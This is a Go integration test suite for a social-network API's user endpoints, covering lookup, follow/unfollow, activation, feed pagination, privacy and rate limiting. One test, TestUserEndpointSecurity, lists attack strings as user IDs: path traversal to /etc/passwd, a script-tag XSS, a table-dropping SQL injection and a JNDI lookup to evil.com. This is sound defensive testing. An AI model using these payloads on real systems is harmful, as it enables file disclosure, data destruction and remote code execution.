// tests/api/users/users_test.go
package users

import (
	"fmt"
	"testing"
	"time"

	"github.com/ozarabal/goSocial/tests/config"
	"github.com/ozarabal/goSocial/tests/data/factories"
	"github.com/ozarabal/goSocial/tests/framework/assertions"
	"github.com/ozarabal/goSocial/tests/framework/client"
	"github.com/stretchr/testify/suite"
)

// UsersTestSuite contains all users-related tests
type UsersTestSuite struct {
	suite.Suite
	client      *client.APIClient
	config      *config.TestConfig
	userFactory *factories.UserFactory
	testUser    *factories.UserData
	authToken   string
}

// SetupSuite runs once before all tests
func (suite *UsersTestSuite) SetupSuite() {
	suite.config = config.GetTestConfig()
	suite.Require().NoError(suite.config.Validate())
	
	suite.client = client.NewAPIClient(suite.config.API.BaseURL)
	suite.client.SetHeaders(suite.config.API.Headers)
	
	suite.userFactory = factories.NewUserFactory()
	
	// Create and authenticate a test user
	suite.createAndAuthenticateTestUser()
}

// createAndAuthenticateTestUser creates a user and gets auth token
func (suite *UsersTestSuite) createAndAuthenticateTestUser() {
	suite.testUser = suite.userFactory.Create()
	
	// Register user
	regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
		"username": suite.testUser.Username,
		"email":    suite.testUser.Email,
		"password": suite.testUser.Password,
	})
	
	suite.Require().Equal(201, regResponse.StatusCode, "User registration should succeed")
	
	// Get user ID
	userID := assertions.NewResponseAssertion(suite.T(), regResponse).
		GetJSONField("data.id")
	suite.testUser.ID = int64(userID.(float64))
	
	// Login to get token
	loginResponse := suite.client.POST("/authentication/token", map[string]interface{}{
		"email":    suite.testUser.Email,
		"password": suite.testUser.Password,
	})
	
	suite.Require().Equal(200, loginResponse.StatusCode, "User login should succeed")
	
	// Extract and set auth token
	suite.authToken = assertions.NewResponseAssertion(suite.T(), loginResponse).
		GetJSONField("data").(string)
	
	suite.client.SetAuth(suite.authToken)
}

// SetupTest runs before each test
func (suite *UsersTestSuite) SetupTest() {
	// Ensure we have auth token set
	suite.client.SetAuth(suite.authToken)
}

// TestGetUser_Success tests successful user retrieval
func (suite *UsersTestSuite) TestGetUser_Success() {
	response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(200).
		ShouldHaveValidUserResponse().
		ShouldHaveJSONFieldValue("data.id", float64(suite.testUser.ID)).
		ShouldHaveJSONFieldValue("data.username", suite.testUser.Username).
		ShouldHaveJSONFieldValue("data.email", suite.testUser.Email).
		ShouldHaveJSONField("data.created_at").
		ShouldHaveJSONField("data.isActive").
		ShouldHaveJSONField("data.role")
}

// TestGetUser_Unauthorized tests user retrieval without authentication
func (suite *UsersTestSuite) TestGetUser_Unauthorized() {
	// Create client without auth token
	unauthClient := client.NewAPIClient(suite.config.API.BaseURL)
	
	response := unauthClient.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(401).
		ShouldHaveValidErrorResponse()
}

// TestGetUser_NotFound tests retrieval of non-existent user
func (suite *UsersTestSuite) TestGetUser_NotFound() {
	nonExistentID := 999999
	
	response := suite.client.GET(fmt.Sprintf("/users/%d", nonExistentID))
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(404).
		ShouldHaveValidErrorResponse()
}

// TestGetUser_InvalidID tests retrieval with invalid user ID
func (suite *UsersTestSuite) TestGetUser_InvalidID() {
	invalidIDs := []string{"abc", "0", "-1", "1.5"}
	
	for _, id := range invalidIDs {
		suite.Run("Invalid ID: "+id, func() {
			response := suite.client.GET("/users/" + id)
			
			// Should be either 400 (bad request) or 500 (server error)
			assertions.NewResponseAssertion(suite.T(), response).
				ShouldSatisfy(func(r *client.APIResponse) bool {
					return r.StatusCode == 400 || r.StatusCode == 500
				}, "Should return error for invalid ID")
		})
	}
}

// TestFollowUser_Success tests successful user following
func (suite *UsersTestSuite) TestFollowUser_Success() {
	// Create another user to follow
	targetUser := suite.userFactory.Create()
	regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
		"username": targetUser.Username,
		"email":    targetUser.Email,
		"password": targetUser.Password,
	})
	
	targetUserID := assertions.NewResponseAssertion(suite.T(), regResponse).
		GetJSONField("data.id").(float64)
	
	// Follow the user
	response := suite.client.PUT(fmt.Sprintf("/users/%.0f/follow", targetUserID), nil)
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(204).
		ShouldHaveEmptyBody()
}

// TestFollowUser_SelfFollow tests attempting to follow oneself
func (suite *UsersTestSuite) TestFollowUser_SelfFollow() {
	response := suite.client.PUT(fmt.Sprintf("/users/%d/follow", suite.testUser.ID), nil)
	
	// Should either be forbidden or bad request
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldSatisfy(func(r *client.APIResponse) bool {
			return r.StatusCode == 400 || r.StatusCode == 403
		}, "Should not allow self-following")
}

// TestFollowUser_NonExistentUser tests following a non-existent user
func (suite *UsersTestSuite) TestFollowUser_NonExistentUser() {
	nonExistentID := 999999
	
	response := suite.client.PUT(fmt.Sprintf("/users/%d/follow", nonExistentID), nil)
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(404).
		ShouldHaveValidErrorResponse()
}

// TestFollowUser_DuplicateFollow tests following the same user twice
func (suite *UsersTestSuite) TestFollowUser_DuplicateFollow() {
	// Create another user to follow
	targetUser := suite.userFactory.Create()
	regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
		"username": targetUser.Username,
		"email":    targetUser.Email,
		"password": targetUser.Password,
	})
	
	targetUserID := assertions.NewResponseAssertion(suite.T(), regResponse).
		GetJSONField("data.id").(float64)
	
	// Follow the user first time
	firstResponse := suite.client.PUT(fmt.Sprintf("/users/%.0f/follow", targetUserID), nil)
	assertions.NewResponseAssertion(suite.T(), firstResponse).
		ShouldHaveStatus(204)
	
	// Try to follow again
	secondResponse := suite.client.PUT(fmt.Sprintf("/users/%.0f/follow", targetUserID), nil)
	
	// Should either succeed (idempotent) or return conflict
	assertions.NewResponseAssertion(suite.T(), secondResponse).
		ShouldSatisfy(func(r *client.APIResponse) bool {
			return r.StatusCode == 204 || r.StatusCode == 409
		}, "Duplicate follow should be handled gracefully")
}

// TestUnfollowUser_Success tests successful user unfollowing
func (suite *UsersTestSuite) TestUnfollowUser_Success() {
	// Create another user to follow then unfollow
	targetUser := suite.userFactory.Create()
	regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
		"username": targetUser.Username,
		"email":    targetUser.Email,
		"password": targetUser.Password,
	})
	
	targetUserID := assertions.NewResponseAssertion(suite.T(), regResponse).
		GetJSONField("data.id").(float64)
	
	// Follow the user first
	followResponse := suite.client.PUT(fmt.Sprintf("/users/%.0f/follow", targetUserID), nil)
	assertions.NewResponseAssertion(suite.T(), followResponse).
		ShouldHaveStatus(204)
	
	// Now unfollow
	unfollowResponse := suite.client.PUT(fmt.Sprintf("/users/%.0f/unfollow", targetUserID), nil)
	
	assertions.NewResponseAssertion(suite.T(), unfollowResponse).
		ShouldHaveStatus(204).
		ShouldHaveEmptyBody()
}

// TestUnfollowUser_NotFollowing tests unfollowing a user not being followed
func (suite *UsersTestSuite) TestUnfollowUser_NotFollowing() {
	// Create another user but don't follow them
	targetUser := suite.userFactory.Create()
	regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
		"username": targetUser.Username,
		"email":    targetUser.Email,
		"password": targetUser.Password,
	})
	
	targetUserID := assertions.NewResponseAssertion(suite.T(), regResponse).
		GetJSONField("data.id").(float64)
	
	// Try to unfollow without following first
	response := suite.client.PUT(fmt.Sprintf("/users/%.0f/unfollow", targetUserID), nil)
	
	// Should either succeed (idempotent) or return not found
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldSatisfy(func(r *client.APIResponse) bool {
			return r.StatusCode == 204 || r.StatusCode == 404
		}, "Unfollow of non-followed user should be handled gracefully")
}

// TestUserActivation_Success tests user activation with token
func (suite *UsersTestSuite) TestUserActivation_Success() {
	// Create a new user (will be inactive)
	newUser := suite.userFactory.Create()
	regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
		"username": newUser.Username,
		"email":    newUser.Email,
		"password": newUser.Password,
	})
	
	// Extract activation token from response
	activationToken := assertions.NewResponseAssertion(suite.T(), regResponse).
		GetJSONField("data.token").(string)
	
	// Activate the user
	response := suite.client.PUT("/users/activate/"+activationToken, nil)
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(204).
		ShouldHaveEmptyBody()
}

// TestUserActivation_InvalidToken tests activation with invalid token
func (suite *UsersTestSuite) TestUserActivation_InvalidToken() {
	invalidTokens := []string{
		"invalid-token",
		"",
		"123456789",
		"expired-token-format",
	}
	
	for _, token := range invalidTokens {
		suite.Run("Invalid token: "+token, func() {
			response := suite.client.PUT("/users/activate/"+token, nil)
			
			assertions.NewResponseAssertion(suite.T(), response).
				ShouldHaveStatus(404).
				ShouldHaveValidErrorResponse()
		})
	}
}

// TestUserFeed_Success tests getting user feed
func (suite *UsersTestSuite) TestUserFeed_Success() {
	response := suite.client.GET("/users/feed")
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(200).
		ShouldHaveJSONField("data").
		ShouldHaveJSONFieldType("data", "slice") // Should be an array
}

// TestUserFeed_WithPagination tests user feed with pagination parameters
func (suite *UsersTestSuite) TestUserFeed_WithPagination() {
	testCases := []struct {
		name   string
		params string
	}{
		{
			name:   "Default pagination",
			params: "",
		},
		{
			name:   "Custom limit",
			params: "?limit=10",
		},
		{
			name:   "Custom offset",
			params: "?offset=5",
		},
		{
			name:   "Limit and offset",
			params: "?limit=5&offset=10",
		},
		{
			name:   "Sort ascending",
			params: "?sort=asc",
		},
		{
			name:   "Sort descending",
			params: "?sort=desc",
		},
		{
			name:   "With search",
			params: "?search=test",
		},
		{
			name:   "With tags",
			params: "?tags=tech,golang",
		},
		{
			name:   "Complex query",
			params: "?limit=5&offset=0&sort=desc&search=test&tags=tech",
		},
	}
	
	for _, tc := range testCases {
		suite.Run(tc.name, func() {
			response := suite.client.GET("/users/feed" + tc.params)
			
			assertions.NewResponseAssertion(suite.T(), response).
				ShouldHaveStatus(200).
				ShouldHaveJSONField("data")
		})
	}
}

// TestUserFeed_InvalidPagination tests feed with invalid pagination parameters
func (suite *UsersTestSuite) TestUserFeed_InvalidPagination() {
	invalidParams := []string{
		"?limit=-1",
		"?limit=0",
		"?limit=21", // Assuming max limit is 20
		"?offset=-1",
		"?sort=invalid",
	}
	
	for _, params := range invalidParams {
		suite.Run("Invalid params: "+params, func() {
			response := suite.client.GET("/users/feed" + params)
			
			// Should return 400 for invalid parameters
			assertions.NewResponseAssertion(suite.T(), response).
				ShouldHaveStatus(400).
				ShouldHaveValidErrorResponse()
		})
	}
}

// TestUserPermissions tests different user permission scenarios
func (suite *UsersTestSuite) TestUserPermissions() {
	// Create multiple users with different roles if available
	// This test would depend on your role-based access control implementation
	
	// For now, just test basic user access
	response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(200).
		ShouldHaveJSONField("data.role").
		ShouldHaveJSONFieldValue("data.role.name", "user") // Default role
}

// TestConcurrentUserOperations tests concurrent user operations
func (suite *UsersTestSuite) TestConcurrentUserOperations() {
	if !suite.config.Parallel.Enabled {
		suite.T().Skip("Parallel tests disabled")
		return
	}
	
	// Create multiple users to follow
	users := suite.userFactory.CreateMultiple(5)
	userIDs := make([]float64, 0, len(users))
	
	// Register all users first
	for _, user := range users {
		regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
			"username": user.Username,
			"email":    user.Email,
			"password": user.Password,
		})
		
		if regResponse.StatusCode == 201 {
			userID := assertions.NewResponseAssertion(suite.T(), regResponse).
				GetJSONField("data.id").(float64)
			userIDs = append(userIDs, userID)
		}
	}
	
	// Now follow all users concurrently
	results := make(chan *client.APIResponse, len(userIDs))
	
	for _, userID := range userIDs {
		go func(id float64) {
			response := suite.client.PUT(fmt.Sprintf("/users/%.0f/follow", id), nil)
			results <- response
		}(userID)
	}
	
	// Collect results
	successCount := 0
	for i := 0; i < len(userIDs); i++ {
		response := <-results
		if response.StatusCode == 204 {
			successCount++
		}
	}
	
	suite.Equal(len(userIDs), successCount, "All concurrent follow operations should succeed")
}

// TestUserDataPrivacy tests that sensitive user data is not exposed
func (suite *UsersTestSuite) TestUserDataPrivacy() {
	response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(200).
		ShouldSatisfy(func(r *client.APIResponse) bool {
			// Ensure password is not included in response
			_, hasPassword := r.JSON["data"].(map[string]interface{})["password"]
			return !hasPassword
		}, "Password should not be included in user response")
}

// TestUserCacheIntegration tests user data caching behavior
func (suite *UsersTestSuite) TestUserCacheIntegration() {
	// Make first request to potentially cache the user
	firstResponse := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	assertions.NewResponseAssertion(suite.T(), firstResponse).
		ShouldHaveStatus(200)
	
	// Make second request (should potentially come from cache)
	secondResponse := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	assertions.NewResponseAssertion(suite.T(), secondResponse).
		ShouldHaveStatus(200)
	
	// Both responses should have the same data
	firstUserData := firstResponse.JSON["data"]
	secondUserData := secondResponse.JSON["data"]
	
	suite.Equal(firstUserData, secondUserData, "Cached and non-cached responses should be identical")
}

// TestUserSearchFunctionality tests user search if implemented
func (suite *UsersTestSuite) TestUserSearchFunctionality() {
	// This test assumes there might be a user search endpoint
	// Skip if not implemented
	response := suite.client.GET("/users?search=" + suite.testUser.Username[:3])
	
	// If endpoint exists, should return 200, otherwise 404
	if response.StatusCode == 200 {
		assertions.NewResponseAssertion(suite.T(), response).
			ShouldHaveJSONField("data").
			ShouldHaveJSONFieldType("data", "slice")
	} else {
		suite.T().Skip("User search endpoint not implemented")
	}
}

// TestFollowUnfollowWorkflow tests complete follow/unfollow workflow
func (suite *UsersTestSuite) TestFollowUnfollowWorkflow() {
	// Create target user
	targetUser := suite.userFactory.Create()
	regResponse := suite.client.POST("/authentication/user", map[string]interface{}{
		"username": targetUser.Username,
		"email":    targetUser.Email,
		"password": targetUser.Password,
	})
	
	targetUserID := assertions.NewResponseAssertion(suite.T(), regResponse).
		GetJSONField("data.id").(float64)
	
	// Step 1: Follow user
	followResponse := suite.client.PUT(fmt.Sprintf("/users/%.0f/follow", targetUserID), nil)
	assertions.NewResponseAssertion(suite.T(), followResponse).
		ShouldHaveStatus(204)
	
	// Step 2: Verify following (if there's an endpoint to check followers)
	// This would depend on having a followers endpoint
	
	// Step 3: Unfollow user
	unfollowResponse := suite.client.PUT(fmt.Sprintf("/users/%.0f/unfollow", targetUserID), nil)
	assertions.NewResponseAssertion(suite.T(), unfollowResponse).
		ShouldHaveStatus(204)
	
	// Step 4: Verify unfollowing
	// Again, this would depend on having a followers endpoint
}

// TestUserProfileCompleteness tests that user profile has all required fields
func (suite *UsersTestSuite) TestUserProfileCompleteness() {
	response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(200).
		ShouldHaveValidUserResponse()
	
	// Check for additional fields that might be present
	userData := response.JSON["data"].(map[string]interface{})
	
	requiredFields := []string{"id", "username", "email", "created_at", "isActive", "role"}
	for _, field := range requiredFields {
		suite.Contains(userData, field, "User response should contain field: "+field)
	}
	
	// Check that role object has required structure
	if role, ok := userData["role"].(map[string]interface{}); ok {
		roleFields := []string{"id", "name", "level", "description"}
		for _, field := range roleFields {
			suite.Contains(role, field, "Role object should contain field: "+field)
		}
	}
}

// TestUserRateLimiting tests rate limiting on user endpoints
func (suite *UsersTestSuite) TestUserRateLimiting() {
	if !suite.config.API.RateLimits.TestRateLimit {
		suite.T().Skip("Rate limiting tests disabled")
		return
	}
	
	// Make requests up to rate limit
	for i := 0; i < suite.config.API.RateLimits.RequestsPerSecond; i++ {
		response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
		suite.NotEqual(429, response.StatusCode, "Should not be rate limited within allowed requests")
	}
	
	// Next request should be rate limited
	response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	
	// Should be rate limited or still succeed (depending on rate limiter implementation)
	// Most rate limiters allow some burst
	if response.StatusCode == 429 {
		assertions.NewResponseAssertion(suite.T(), response).
			ShouldHaveHeader("Retry-After")
	}
}

// TestUserEndpointSecurity tests security aspects of user endpoints
func (suite *UsersTestSuite) TestUserEndpointSecurity() {
	// Test with malicious user IDs
	maliciousIDs := []string{
		"../../../etc/passwd",
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		"${jndi:ldap://evil.com/a}",
	}
	
	for _, maliciousID := range maliciousIDs {
		suite.Run("Security test: "+maliciousID, func() {
			response := suite.client.GET("/users/" + maliciousID)
			
			// Should handle malicious input gracefully (400 or 404, not 500)
			assertions.NewResponseAssertion(suite.T(), response).
				ShouldSatisfy(func(r *client.APIResponse) bool {
					return r.StatusCode == 400 || r.StatusCode == 404
				}, "Should handle malicious input safely")
		})
	}
}

// TestUserResponseHeaders tests that appropriate headers are set
func (suite *UsersTestSuite) TestUserResponseHeaders() {
	response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(200).
		ShouldHaveHeader("Content-Type").
		ShouldHaveHeaderValue("Content-Type", "application/json")
	
	// Test for security headers if they should be present
	// This depends on your middleware configuration
}

// TestUserEndpointPerformance tests response time of user endpoints
func (suite *UsersTestSuite) TestUserEndpointPerformance() {
	// Simple performance test - measure response time
	start := time.Now()
	response := suite.client.GET(fmt.Sprintf("/users/%d", suite.testUser.ID))
	duration := time.Since(start)
	
	assertions.NewResponseAssertion(suite.T(), response).
		ShouldHaveStatus(200)
	
	// Assert that response time is reasonable (adjust threshold as needed)
	suite.Less(duration, suite.config.Timeouts.APIRequest/2, 
		"User endpoint should respond quickly")
}

// Run the test suite
func TestUsersTestSuite(t *testing.T) {
	suite.Run(t, new(UsersTestSuite))
}